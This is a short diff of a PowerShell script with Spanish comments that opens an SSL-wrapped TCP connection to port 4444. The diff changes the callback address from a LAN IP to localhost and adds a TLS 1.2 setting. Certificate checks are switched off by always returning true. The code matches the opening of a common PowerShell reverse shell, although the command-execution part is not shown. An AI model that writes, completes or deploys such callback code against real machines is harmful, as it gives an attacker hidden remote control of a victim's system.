@@ -1,5 +1,6 @@
 # Reemplaza '192.168.1.X' por tu IPv4 real obtenida con ipconfig
-$TCPClient = New-Object Net.Sockets.TCPClient('192.168.0.13', 4444);
+$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
+$TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 4444);
 $NetworkStream = $TCPClient.GetStream();
 $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
 
